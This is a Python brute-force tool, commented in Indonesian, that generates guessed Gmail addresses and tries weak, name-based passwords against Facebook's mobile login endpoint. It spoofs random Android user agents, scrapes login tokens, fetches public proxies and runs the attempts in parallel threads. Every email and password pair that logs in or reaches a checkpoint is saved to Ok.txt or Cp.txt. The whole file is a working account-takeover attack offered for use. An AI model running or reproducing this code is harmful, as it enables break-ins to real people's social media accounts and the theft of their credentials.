from bs4 import BeautifulSoup as sop
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
from bs4 import BeautifulSoup as sop
from rich.panel import Panel
from rich.tree import Tree
from rich import print as prints
import requests,bs4,json,os,sys,random,datetime,time,re
import urllib3,rich,base64
from rich.table import Table as me
from rich.console import Console as sol
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
from rich.console import Group as gp
from rich.panel import Panel as nel
from rich import print as cetak
from rich.markdown import Markdown as mark
from rich.columns import Columns as col
from rich import print as rprint
from rich import pretty
from rich.text import Text as tekz
import time
import os,sys,time,json,random,re,string,platform,base64,uuid
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from os import system as s
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')
RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today() 
loop = 0
oks = []
reset = "[/]"
cps = []
ugen2=[]
ugen=[]
cokbrut=[]
ses=requests.Session()
princp=[]
try:
 prox= requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
 open('.prox.txt','w').write(prox)
except Exception as e:
 print('')
prox=open('.prox.txt','r').read().splitlines()
for xd in range(10000):
    a='Nokia'
    b=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    c=random.randrange(1, 99)
    d='/GoBrowser/'
    e='1.6.0.'
    f=random.randrange(1, 99)
    uaku2=(f'{a}{b}{c}{d}{e}{f}')
    ugen.append(uaku2)
   ###----------[ WARNA PRINT BIASA ]---------- ###
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'	# WARNA MATI

###----------[ WARNA PRINT RICH ]---------- ###
Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU
###----------[ CEK WARNA TEMA ]---------- ###
try:
	color_rich = open("data/color_rich.txt","r").read()
except FileNotFoundError:
	color_rich = "[#00C8FF]"
try:
	color_table = open("data/color_table.txt","r").read()
except FileNotFoundError:
	color_table = "#00C8FF"
def banner():
	bersihkan_layar()
	prints(Panel(f"""{color_rich} 
 ██████  ▒█████   ▄▄▄▄    █    ██  ▄▄▄██▀▀▀
▒██    ▒ ▒██▒  ██▒▓█████▄  ██  ▓██▒   ▒██   
░ ▓██▄   ▒██░  ██▒▒██▒ ▄██▓██  ▒██░   ░██   
  ▒   ██▒▒██   ██░▒██░█▀  ▓▓█  ░██░▓██▄██▓  
▒██████▒▒░ ████▓▒░░▓█  ▀█▓▒▒█████▓  ▓███▒   
▒ ▒▓▒ ▒ ░░ ▒░▒░▒░ ░▒▓███▀▒░▒▓▒ ▒ ▒  ▒▓▒▒░   
░ ░▒  ░ ░  ░ ▒ ▒░ ▒░▒   ░ ░░▒░ ░ ░  ▒ ░▒░   
░  ░  ░  ░ ░ ░ ▒   ░    ░  ░░░ ░ ░  ░ ░ ░   
      ░      ░ ░   ░         ░      ░   ░   
                        ░                   
 Made By {H2}Ban{M2}glad{H2}eshi {O2}Programmer""",style=f"{color_table}"))
def bersihkan_layar():
	if "linux" in sys.platform.lower():
		try:os.system("clear")
		except:pass
	elif "win" in sys.platform.lower():
		try:os.system("cls")
		except:pass
	else:
		try:os.system("clear")
		except:pass




_anjing_kontol_memek='Recode aja gausah dijual ya memek'
N = "\x1b[00m"
M = "\x1b[1;91m"
K = "\x1b[1;93m"
H = "\x1b[1;92m"
B = "\x1b[1;94m"
U = "\x1b[1;95m"
C = "\x1b[2;96m"
P = "\x1b[1;97m"
import os, sys, subprocess
os.system("clear")
for ngimport in range(6):
	try:
		import requests
		import gtts
	except ImportError as eror:
		print ("{}[{}!{}] {}Sedang menginstall module {}{}".format(H,M,H,P,H,eror.name))
		os.system("python -m pip install {} &> /dev/null".format(eror.name))
import time, random, json, re
from concurrent.futures import ThreadPoolExecutor as xenz
from time import sleep
from gtts import gTTS


class Main:
	def __init__(self):
		os.popen('play-audio .halo.mp3')
		self.email = []
		self.ok = 0
		self.cp = 0
		self.loop = 0
		self.nama = 'Xenz'
		try:
			self.sim = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[1].replace("\n","")
		except:
			self.sim = subprocess.check_output("getprop gsm.operator.alpha",shell=True).decode("utf-8").split(",")[0].replace("\n","")
		self.menu()
	def menu(self):
		os.system('clear')
		self.list = ('''{}========================================
{} Nama kamu: {}{}
{} Kartu sim: {}{}
{}========================================
{} 1. {}Crack email
{} 2. {}Cek result

{} [{} Pilih No {}1{}/{}2 {}]
{}        └────────────► {}'''.format(B,P,H,self.nama,P,H,self.sim,B,K,P,K,P,M,P,K,P,K,M,P,H))
		self.pilih = input(self.list)
		if self.pilih == '1':self.generator_email()
		elif self.pilih == '2':self.cek_result()
		else:print ('{} Pilih yang bener lah kontol'.format(M));sleep(3);Main()
	def cek_result(self):
		self.list = ('''{}========================================
 1. Result Ok             2. Result Cp
========================================
 [ Pilih No 1/2 ]
        └────────────► {}'''.format(P,H))
		self.milachan = input(self.list)
		if self.milachan == '1':
			self.buka = open('Ok.txt','r').read().splitlines()
			for akun in self.buka:
				print (akun)
		if self.milachan == '2':
			self.buka = open('Cp.txt','r').read().splitlines()
			for akun in self.buka:
				print (akun)
		else:exit()

	def generator_email(self):
		self.text = ('''{}========================================
{} input nama for dump email
{} Example: {}xenz
{}========================================
{} [ {}input nama {}]
{}        └────────────► {}'''.format(B,P,P,H,B,M,P,M,P,H))
		self.user = input(self.text).lower()
		#hhlsdmslbdxmxj@exdonuts.com
		self.domain = '@gmail.com'
		for ngedump in range(random.randint(999,5000)):
			self.depan = random.choice(['mst','angel','ewr','reactor','md','uddin','khan','sayed','fokir','hasan','ahmed','mia','akther','beagum','jahan','islam','123','1234','110','120','130','140','150','160','170','180','210','220','017','019','018','abcd','xyz','230','240','250','260','270','280','290','300','310','320','330','340','350','360','370','380','390','400','410','420','430','440','450','460','470','480','490','500','1100','6965','952','7864','786','063','0000','13231','8634','79587','75279','0863268','742578','8643','xxxx','irshjvc','646799743','23578095432','8534788','015','57874211111','9754','6666','7777','8888','9999','000','096','087','03565','5322','9653','4622','5421','8643','86543','854321','875443','97654','543223','87554','98765','54321','764433','2222','3333','4444','5555','6666','7777','8888','9999','1000','2000','3000','4000','5000','6000','7000','7543','76554','4321','7654','9753','07532','77654','96312467','882827262','928282727','818181717','6532288','7655555','99876543','65332','moni','jannat','mirza','khatun','deb','roy','nath','rahman','talukder','paul','chowdury','chanda'])
			self.belakang = random.choice(['mst','angel','ewr','reactor','md','uddin','khan','sayed','fokir','hasan','ahmed','mia','akther','beagum','jahan','islam','123','1234','110','120','130','140','150','160','170','180','210','220','017','019','018','abcd','xyz','230','240','250','260','270','280','290','300','310','320','330','340','350','360','370','380','390','400','410','420','430','440','450','460','470','480','490','500','1100','6965','952','7864','786','063','0000','13231','8634','79587','75279','0863268','742578','8643','xxxx','irshjvc','646799743','23578095432','8534788','015','57874211111','9754','6666','7777','8888','9999','000','096','087','03565','5322','9653','4622','5421','8643','86543','854321','875443','97654','543223','87554','98765','54321','764433','2222','3333','4444','5555','6666','7777','8888','9999','1000','2000','3000','4000','5000','6000','7000','7543','76554','4321','7654','9753','07532','77654','96312467','882827262','928282727','818181717','6532288','7655555','99876543','65332','moni''jannat','mirza','khatun','deb','roy','nath','rahman','talukder','paul','chowdury','chanda'])
			self.tahun = str(random.randint(1,3035))
			self.email1 = self.user+self.belakang+self.domain
			self.email2 = self.depan+self.user+self.domain
			self.email3 = self.depan+self.user+self.belakang+self.domain
			self.email4 = self.user+self.tahun+self.domain
			self.email5 = self.user+self.belakang+self.tahun+self.domain
			self.email6 = self.depan+self.user+self.belakang+self.domain
			if (self.email1+'|'+self.user) in self.email:pass
			else:self.email.append(self.email1+'|'+self.user)
			if (self.email2+'|'+self.user) in self.email:pass
			else:self.email.append(self.email2+'|'+self.user)
			if (self.email3+'|'+self.user) in self.email:pass
			else:self.email.append(self.email3+'|'+self.user)
			if (self.email4+'|'+self.user) in self.email:pass
			else:self.email.append(self.email4+'|'+self.user)
			if (self.email5+'|'+self.user) in self.email:pass
			else:self.email.append(self.email5+'|'+self.user)
			if (self.email6+'|'+self.user) in self.email:pass
			else:self.email.append(self.email6+'|'+self.user)
			sys.stdout.write('       \r{} Mengumpulkan email: {}{}'.format(P,H,len(self.email)))
			sys.stdout.flush()
			sleep(0.001)
		print ('\r{} Email yang terkumpul: {}{}'.format(P,H,len(self.email)))
		bersihkan_layar()
		banner()
		self.notice = ('''{}├──> While Waiting for Results
{} Results OK Saved In :BLACK_OK.txt
{} Results CP Saved In :CP.txt
{} Play Airplane Mode Any 1k Idz
'''.format(B,P,U,P,P,H,P,H,P,K,P,K,B))
		print (self.notice)
		self.kocok()
	def kocok(self):
		with xenz(max_workers=16) as brute:
			for data in self.email:
				idf = data.split("|")[0]
				nmf = data.split("|")[1]
				listpw = [nmf,nmf+'123',nmf+'1234',nmf+'12345',nmf+'123456','123456']
				brute.submit(self.crack, idf, listpw)
		print ('''\r
{}========================================
{} Crack selesai {}Ok: {}{}   {}Cp: {}{}
{}========================================'''.format(B,C,P,H,self.P,P,K,self.cp,B))
		exit()
	def crack(self, idf, listpw):
		anime = random.choice([C,P,U,B,H,K,M,N])
		sys.stdout.write(f'     \r {U}> {anime}{self.loop}{P}/{C}{len(self.email)} {P}Ok: ({H}{self.ok}{P}) Cp: ({K}{self.cp}{P}) {U}<')
		self.versi = random.choice([str(random.randint(2,9))+'.'+str(random.randint(0,9))+'.'+str(random.randint(0,9)),"10","11","12","13", "14"," 15"])
		self.chrome = str(random.randint(40,198))+'.0.'+str(random.randint(2000,9000))+'.'+str(random.randint(15,128))
		#Mozilla/5.0 (Linux; Android 11; 21121119SG) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36
		self.device = random.choice(["VOG-L29 Build/HUAWEIVOG-L29","STK-LX3 Build/HUAWEISTK-LX3","BTV-W09 Build/HUAWEIBEETHOVEN-W09","CLT-AL00 Build/HUAWEICLT-AL00","LYA-AL10 Build/HUAWEILYA-AL10","ELE-L29 Build/HUAWEIELE-L29","DIG-AL00 Build/HUAWEIDIG-AL00","EVA-L09 Build/HUAWEIEVA-L09;SM-N975U1 Build/SP1A.210812.016; wv","SM-A105F","SC-01G Build/LRX22C; wv","SC-01H Build/LMY47X; wv","SM-G850F Build/LRX22G","SM-C9000 Build/MMB29M; wv","SM-G928F","SM-J111M Build/LMY47V; wv","SM-G532M","SM-J337V Build/PPR1.180610.011; wv","SM-J3110 Build/LMY47X; wv","SM-J730F","SM-J200BT Build/LMY47X; wv","SM-G530T1 Build/LMY47X; wv","GT-P3113; Flow","SM-G960F Build/R16NW; wv","CPH1869", "CPH1929","CPH2107", "CPH2238", "CPH2389","CPH2401", "CPH2407", "CPH2413", "CPH2415", "CPH2417", "CPH2419", "CPH2455", "CPH2459", "CPH2461", "CPH2471", "CPH2473", "CPH2477", "CPH8893", "CPH2321", "CPH2341", "CPH2373", "CPH2083", "CPH2071", "CPH2077", "CPH2185", "CPH2179", "CPH2269", "CPH2421", "CPH2349", "CPH2271", "CPH1923", "CPH1925", "CPH1837", "CPH2015", "CPH2073", "CPH2081", "CPH2029", "CPH2031", "CPH2137", "CPH1605", "CPH1803", "CPH1853", "CPH1805", "CPH1809", "CPH1851", "CPH1931", "CPH1959", "CPH1933", "CPH1935", "CPH1943", "CPH2061", "CPH2069", "CPH2127", "CPH2131", "CPH2139", "CPH2135", "CPH2239", "CPH2195", "CPH2273", "CPH2325", "CPH2309", "CPH1701", "CPH2387", "CPH1909", "CPH1920", "CPH1912", "CPH1901", "CPH1903", "CPH1905", "CPH1717", "CPH1801", "CPH2067", "CPH2099", "CPH2161", "CPH2219", "CPH2197", "CPH2263", "CPH2375", "CPH2339", "CPH1715", "CPH2385", "CPH1729", "CPH1827", "CPH1938", "CPH1937", "CPH1939", "CPH1941", "CPH2001", "CPH2021", "CPH2059", "CPH2121", "CPH2123", "CPH2203", "CPH2333", "CPH2365", "CPH1913", "CPH1911", "CPH1915", "CPH1969", "CPH2209", "CPH1987", "CPH2095", "CPH2119", "CPH2285", "CPH2213", "CPH2223", "CPH2363", "CPH1609", "CPH1613", "CPH1723", "CPH1727", "CPH1725", "CPH1819", "CPH1821", "CPH1825", "CPH1881", "CPH1823", "CPH1871", "CPH1875", "CPH2023", "CPH2005", "CPH2025", "CPH2207", "CPH2173", "CPH2307", "CPH2305", "CPH2337", "CPH1955", "CPH1707", "CPH1719", "CPH1721", "CPH1835", "CPH1831", "CPH1833", "CPH1879", "CPH1893", "CPH1877", "CPH1607", "CPH1611", "CPH1917", "CPH1919", "CPH1907", "CPH1989", "CPH1945", "CPH1951", "CPH2043", "CPH2035", "CPH2037", "CPH2036", "CPH2009", "CPH2013", "CPH2113", "CPH2091", "CPH2125", "CPH2109", "CPH2089", "CPH2065", "CPH2159", "CPH2145", "CPH2205", "CPH2201", "CPH2199", "CPH2217", "CPH1921", "CPH2211", "CPH2235", "CPH2251", "CPH2249", "CPH2247", "CPH2237", "CPH2371", "CPH2293", "CPH2353", "CPH2343", "CPH2359", "CPH2357", "CPH2457", "CPH1983", "CPH1979","V2061", "V2153","V2202", "V2104", "V2101","V2102", "V2103", "V1963A", "V2202", "V2205", "V2052", "V2027", "V2029", "V2130", "V2110", "V1962A", "V2002A", "V2046A", "V2050", "V2070", "V2145A", "V2026", "V2043", "V2057A", "V2012A", "V2072A", "V1962A", "V1730DA", "V1832A", "V2130A", "V2031A", "V2027", "V2126", "V2070", "V2047A", "V1816T", "V2118A", "V1930A", "V1962A", "V2054A", "V1813BT", "V2054A", "V2034A", "V2072A", "V2026", "V2002A", "V1932A", "V2020CA", "V2162A", "V1965A", "V1975A", "V1814A", "V2162A", "V2024A","E025F", "G996B", "A826S", "E135F", "G781B", "G998B", "F936U1", "G361F", "A716S", "J327AZ", "E426B", "A015F", "A015M", "A013G", "A013G", "A013M", "A013F", "A022M", "A022G", "A022F", "A025M", "S124DL", "A025U", "A025A", "A025G", "A025F", "A025AZ", "A035F", "A035M", "A035G", "A032F", "A032M", "A032F", "A037F", "A037U", "A037M", "S134DL", "A037G", "A105G", "A105M", "A105F", "A105FN", "A102U", "S102DL", "A102U1", "A107F", "A107M", "A115AZ", "A115U", "A115U1", "A115A", "A115M", "A115F", "A125F", "A127F", "A125M", "A125U", "A127M", "A135F", "A137F", "A135M", "A136U", "A136U1", "A136W", "A260F", "A260G", "A260F", "A260G", "A205GN", "A205U", "A205F", "A205G", "A205FN", "A202F", "A2070", "A207F", "A207M", "A215U", "A215U1", "A217F", "A217F", "A217M", "A225F", "A225M", "A226B", "A226B", "A226BR", "A235F", "A235M", "A300FU", "A300F", "A300H", "A310F", "A310M", "A320FL", "A320F", "A305G", "A305GT", "A305N", "A305F", "A307FN", "A307G", "A307GN", "A315G", "A315F", "A325F", "A325M", "A326U", "A326W", "A336E", "A336B", "A430F", "A405FN", "A405FM", "A3051", "A3050", "A415F", "A426U", "A426B", "A5009", "A500YZ", "A500Y", "A500W", "A500L", "A500X", "A500XZ", "A510F", "A510Y", "A520F", "A520W", "A500F", "A500FU", "A500H", "S506DL", "A505G", "A505FN", "A505U", "A505GN", "A505F", "A507FN", "A5070", "A515F", "A515U", "A515U1", "A516U", "A516V", "A516N", "A516B", "A525F", "A525M", "A526U", "A526U1", "A526B", "A526W", "A528B", "A536B", "A536U", "A536E", "A536V", "A600FN", "A600G", "A605FN", "A605G", "A605GN", "A605F", "A6050", "A606Y", "A6060", "G6200", "A700FD", "A700F", "A7000", "A700H", "A700YD", "A710F", "A710M", "A720F", "A750F", "A750FN", "A750GN", "A705FN", "A705F", "A705MN", "A707F", "A715F", "A715W", "A716U", "A716V", "A716U1", "A716B", "A725F", "A725M", "A736B", "A530F", "A810YZ", "A810F", "A810S", "A530W", "A530N", "G885F", "G885Y", "G885S", "A730F", "A805F", "G887F", "G8870", "A9000", "A920F", "A920F", "G887N", "A910F", "G8850", "A908B", "A908N", "A9080", "G313HY", "G313MY", "G313MU", "G316M", "G316ML", "G316MY", "G313HZ", "G313H", "G313HU", "G313U", "G318H", "G357FZ", "G310HN", "G357FZ", "G850F", "G850M", "J337AZ", "G386T1", "G386T", "G3858", "G3858", "A226L", "C5000", "C500X", "C5010", "C5018", "C7000", "C7010", "C701F", "C7018", "C7100", "C7108", "C9000", "C900F", "C900Y", "G355H", "G355M", "G3589W", "G386W", "G386F", "G3518", "G3586V", "G5108Q", "G5108", "G3568V", "G350E", "G350", "G3509I", "G3508J", "G3502I", "G3502C", "S820L", "G360H", "G360F", "G360T", "G360M", "G361H", "E500H", "E500F", "E500M", "E5000", "E500YZ", "E700H", "E700F", "E7009", "E700M", "G3815", "G3815", "G3815", "F127G", "E225F", "E236B", "F415F", "E5260", "E625F", "F900U", "F907N", "F900F", "F9000", "F907B", "F900W", "G150NL", "G155S", "G1650", "W2015", "G7102", "G7105", "G7106", "G7108", "G7202", "G720N0", "G7200", "G720AX", "G530T1", "G530H", "G530FZ", "G531H", "G530BT", "G532F", "G531BT", "G531M", "J727AZ", "J100FN", "J100H", "J120FN", "J120H", "J120F", "J120M", "J111M", "J111F", "J110H", "J110G", "J110F", "J110M", "J105H", "J105Y", "J105B", "J106H", "J106F", "J106B", "J106M", "J200F", "J200M", "J200G", "J200H", "J200F", "J200GU", "J260M", "J260F", "J260MU", "J260F", "J260G", "J200BT", "G532G", "G532M", "G532MT", "J250M", "J250F", "J210F", "J260AZ", "J3109", "J320A", "J320G", "J320F", "J320H", "J320FN", "J330G", "J330F", "J330FN", "J337V", "J337P", "J337A", "J337VPP", "J337R4", "J327VPP", "J327V", "J327P", "J327R4", "S327VL", "S337TL", "S367VL", "J327A", "J327T1", "J327T", "J3110", "J3119S", "J3119", "S320VL", "J337T", "J400M", "J400F", "J400F", "J410F", "J410G", "J410F", "J415FN", "J415F", "J415G", "J415GN", "J415N", "J500FN", "J500M", "J510MN", "J510FN", "J510GN", "J530Y", "J530F", "J530G", "J530FM", "G570M", "G570F", "G570Y", "J600G", "J600FN", "J600GT", "J600F", "J610F", "J610G", "J610FN", "J710F", "J700H", "J700M", "J700F", "J700P", "J700T", "J710GN", "J700T1", "J727A", "J727R4", "J737T", "J737A", "J737R4", "J737V", "J737T1", "J737S", "J737P", "J737VPP", "J701F", "J701M", "J701MT", "S767VL", "S757BL", "J720F", "J720M", "G615F", "G615FU", "G610F", "G610M", "G610Y", "G611MT", "G611FF", "G611M", "J730G", "J730GM", "J730F", "J730FM", "S727VL", "S737TL", "J727T1", "J727T1", "J727V", "J727P", "J727VPP", "J727T", "C710F", "J810M", "J810F", "J810G", "J810Y", "A605K", "A605K", "A202K", "M336K", "A326K", "C115", "C115L", "C1158", "C1158", "C115W", "C115M", "S120VL", "M015G", "M015F", "M013F", "M017F", "M022G", "M022F", "M022M", "M025F", "M105G", "M105M", "M105F", "M107F", "M115F", "M115F", "M127F", "M127G", "M135M", "M135F", "M135FU", "M205FN", "M205F", "M205G", "M215F", "M215G", "M225FV", "M236B", "M236Q", "M305F", "M305M", "M307F", "M307FN", "M315F", "M317F", "M325FV", "M325F", "M326B", "M336B", "M336BU", "M405F", "M426B", "M515F", "M526BR", "M526B", "M536B", "M625F", "G750H", "G7508Q", "G7509", "N970U", "N970F", "N971N", "N970U1", "N770F", "N975U1", "N975U", "N975F", "N975F", "N976N", "N980F", "N981U", "N981B", "N985F", "N9860", "N986N", "N986U", "N986B", "N986W", "N9008V", "N9006", "N900A", "N9005", "N900W8", "N900", "N9009", "N900P", "N9000Q", "N9002", "9005", "N750L", "N7505", "N750", "N7502", "N910F", "N910V", "N910C", "N910U", "N910H", "N9108V", "N9100", "N915FY", "N9150", "N915T", "N915G", "N915A", "N915F", "N915S", "N915D", "N915W8", "N916S", "N916K", "N916L", "N916LSK", "N920L", "N920S", "N920G", "N920A", "N920C", "N920V", "N920I", "N920K", "N9208", "N930F", "N9300", "N930x", "N930P", "N930X", "N930W8", "N930V", "N930T", "N950U", "N950F", "N950N", "N960U", "N960F", "N960U", "N935F", "N935K", "N935S", "G550T", "G550FY", "G5500", "G5510", "G550T1", "S550TL", "G5520", "G5528", "G600FY", "G600F", "G6000", "G6100", "G610S", "G611F", "G611L", "G110M", "G110H", "G110B", "G910S", "G316HU", "G977N", "G973U1", "G973F", "G973W", "G973U", "G770U1", "G770F", "G975F", "G975U", "G970U", "G970U1", "G970F", "G970N", "G980F", "G981U", "G981N", "G981B", "G780G", "G780F", "G781W", "G781U", "G7810", "G9880", "G988B", "G988U", "G988B", "G988U1", "G985F", "G986U", "G986B", "G986W", "G986U1", "G991U", "G991B", "G990B", "G990E", "G990U", "G998U", "G996W", "G996U", "G996N", "G9960", "S901U", "S901B", "S908U", "S908U1", "S908B", "S9080", "S908N", "S908E", "S906U", "S906E", "S906N", "S906B", "S906U1", "G730V", "G730A", "G730W8", "C105L", "C101", "C105", "C105K", "C105S", "G900F", "G900P", "G900H", "G9006V", "G900M", "G900V", "G870W", "G890A", "G870A", "G900FD", "G860P", "G901F", "G901F", "G800F", "G800H", "G903F", "G903W", "G920F", "G920K", "G920I", "G920A", "G920P", "G920S", "G920V", "G920T", "G925F", "G925A", "G925W8", "G928F", "G928C", "G9280", "G9287", "G928T", "G928I", "G930A", "G930F", "G930W8", "G930S", "G930V", "G930P", "G930L", "G891A", "G935F", "G935T", "G935W8", "G9350", "G950F", "G950W", "G950U", "G892A", "G892U", "G8750", "G955F", "G955U", "G955U1", "G955W", "G955N", "G960U", "G960U1", "G960F", "G965U", "G965F", "G965U1", "G965N", "G9650", "J321AZ", "J326AZ", "J336AZ", "T116", "T116NU", "T116NY", "T116NQ", "T2519", "G318HZ", "T255S", "W2016", "W2018", "W2019", "W2021", "W2022", "G600S", "E426S", "G3812", "G3812B", "G3818", "G388F", "G389F", "G390F", "G398FN","Mi 10T Pro","Mi 11 Lite","MI 8 Lite","MI 5X MIUI","Mi 11i","Xiaomi 11 Lite 5G NE","Xiaomi 12 Lite","Mi 9T Pro","M2004J19PI MIUI","Xiaomi 12S Ultra","MIX 4","Mi 11i","Mi Note 10","Mi 9 SE","Mi 8 SE","Mi 10 SE","MI MAX 3","Xiaomi 12T","MIX 2S","MI 8 SE","Mi A3","Mi A4","MI 6","MI MAX 2","MI MAX 3","Xiaomi 12S Ultra ","Xiaomi 12SE Ultra ","Mi 11i","Mi 12i","Mi 10 Lite 5G","Mi 11 Lite 5G","Mi 12 Lite 5G","Mi 10 Lite 4G","Mi 10 Lite 4G","E6653"," G8231","C6603"," D6503","SO-05F","SGP612","802SO","J9110","SOV40","SO-51A","XQ-AT51"," SOG01","SO51Aa","XQ-AT42","SO-51B","XQ-BC52","XQ-BC62","XQ-BC72","SOG03","J9150","I4113","I3113","I3123","I3113","901SO","J3273","XQ-CC72","XQ-BT44","SO-41B"," C2304","E5506","G3311"," C1905","D5322","RMX1941","RMX1911","RMX3357","RMX3562","RMX3563","RMX3372","RMX3371","RMX3350","RMX2193","RMX2161","RMX2050","RMX3286","RMX3572","RMX3516"])
		ua = 'Mozilla/5.0 (Linux; Android '+self.versi+'; '+self.device+') AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'+self.chrome+' Mobile Safari/537.36'
		for pw in listpw:
			try:
				session = requests.Session()
				HEAD1 = {'Host': 'm.alpha.facebook.com','cache-control': 'max-age=0','sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': "Android",'save-data': 'on','upgrade-insecure-requests': '1','user-agent': ua,'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'navigate','sec-fetch-user': '?1','sec-fetch-dest': 'document','referer': 'https://m.alpha.facebook.com/login/?refsrc=deprecated','accept-encoding': 'gzip, deflate','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',}
				link = session.get('https://m.alpha.facebook.com/login/?refsrc=deprecated',headers=HEAD1)
				data = {'m_ts': re.search('name="m_ts" value="(.*?)"',str(link.text)).group(1),'li': re.search('name="li" value="(.*?)"',str(link.text)).group(1),'try_number': re.search('name="try_number" value="(.*?)"',str(link.text)).group(1),'unrecognized_tries': re.search('name="unrecognized_tries" value="(.*?)"',str(link.text)).group(1),'email': idf,'prefill_contact_point': idf,'prefill_source': 'browser_dropdown','prefill_type': 'contact_point','first_prefill_source': 'browser_dropdown','first_prefill_type': 'contact_point','had_cp_prefilled': True,'had_password_prefilled': False,'is_smart_lock': False,'bi_xrwh': 0,'encpass': '#PWD_BROWSER:0:{}:{}'.format(int(time.time()),pw),'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(link.text)).group(1),'jazoest': re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'__dyn': '0wGaAG1mwHwh8-t0BBBg9oqxK12wAxu13w9y1DxW0Oohw5ux60Vo1a852q1ew65wce09MKdw5Owk888C0l-q3q0ny1Awci1qw8W0iW220jG3qaw4kwbS1Lw9C0z82fw','__csr': '','__req': random.randint(1,9),'__a': re.search('"encrypted":"(.*?)"', str(link.text)).group(1),'__user':0}
				HEAD2 = {'Host': 'm.alpha.facebook.com','content-length': str(len((";").join([ "%s=%s" % (key, value) for key, value in data.items()]))),'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"','content-type': 'application/x-www-form-urlencoded','sec-ch-ua-mobile': '?1','save-data': 'on','user-agent': ua,'sec-ch-ua-platform': "Android",'accept': '*/*','origin': 'https://m.alpha.facebook.com','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','referer': 'https://m.alpha.facebook.com/login/?refsrc=deprecated','accept-encoding': 'gzip, deflate, br','accept-language': 'id-ID,id;q=0.9,en-GB;q=0.8,en;q=0.7,en-US;q=0.6',}
				ress = session.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=data,headers=HEAD2,allow_redirects=False)
				if "c_user" in session.cookies.get_dict().keys():
					self.ok+=1
					open('Ok.txt','a').write(idf+'|'+pw+'\n')
					print (f'\r {P}[{H}OK{P}]{H} {idf}{P}|{H}{pw}')
					break
				if "checkpoint" in session.cookies.get_dict().keys():
					self.cp+=1
					open('Cp.txt','a').write(idf+'|'+pw+'\n')
					print (f'\r {P}[{K}CP{P}]{K} {idf}{P}|{K}{pw}                    ')
					break
				else:continue
			except requests.exceptions.ConnectionError:
				sleep(10)
		self.loop+=1


if __name__=='__main__':
	try:open('nama.txt','r').read()
	except:
		nama = input('input nama: ')
		open('nama.txt','w').write(nama)
		wel = gTTS('Hallo    '+nama+'     Wellcome     To     My      Tools')
		wel.save('.halo.mp3')
	Main()

